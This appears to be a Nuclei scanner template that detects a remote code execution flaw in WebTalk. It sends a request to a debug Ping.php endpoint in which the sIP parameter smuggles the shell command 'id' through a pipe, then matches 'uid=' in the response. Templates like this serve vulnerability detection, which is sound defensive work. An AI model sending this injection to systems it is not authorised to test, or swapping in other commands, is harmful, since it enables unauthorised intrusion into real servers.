id: WebTalk-RCE

info:
  name: WebTalk-RCE
  author: Momika233
  severity: high
  description: Nginx
  reference:
    - https://github.com/momika233
  tags: WebTalk,RCE

requests:
  - method: GET
    path:
      - '{{BaseURL}}/_webtalk/_cur/debugTool/lib/Ping/Ping.php?sIP=|id'


    matchers-condition: and
    matchers:
      - type: regex
        regex:
          - "uid=.*"
        part: body

      - type: status
        status:
          - 200